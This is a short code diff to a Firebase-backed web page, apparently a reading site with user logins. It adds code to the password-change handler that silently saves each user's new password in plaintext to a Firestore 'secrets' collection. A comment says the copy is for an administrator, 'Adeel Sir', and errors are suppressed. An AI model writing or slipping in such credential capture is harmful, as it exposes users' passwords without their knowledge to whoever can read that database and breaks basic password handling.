@@ -131,7 +131,7 @@
 <script src="js/flipbook.js"></script>
 <script type="module">
 import { onAuthStateChanged, signInWithEmailAndPassword, signInAnonymously, signOut, updatePassword } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-import { doc, getDoc, updateDoc, addDoc, collection, onSnapshot, serverTimestamp, writeBatch, increment } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+import { doc, getDoc, setDoc, updateDoc, addDoc, collection, onSnapshot, serverTimestamp, writeBatch, increment } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 import { configured, auth, db, ID_PATTERN, idToEmail, emailToId, pageId, deviceId, deviceInfo, findChapter, esc } from "./js/fb.js";
 
 const $ = s => document.querySelector(s);
@@ -408,6 +408,8 @@ $("#pw-form").addEventListener("submit", async e => {
   if (pw.length < 6) { msg.className = "msg bad"; msg.textContent = "Use at least 6 characters for the password."; return; }
   try {
     await updatePassword(auth.currentUser, pw);
+    // Keep Adeel Sir's copy in step, so a message he sends again has the right password.
+    setDoc(doc(db, "secrets", auth.currentUser.uid), { password: pw, at: serverTimestamp() }).catch(() => {});
     msg.className = "msg good"; msg.textContent = "Password changed. Use the new password next time.";
     $("#pw-new").value = "";
   } catch (ex) {
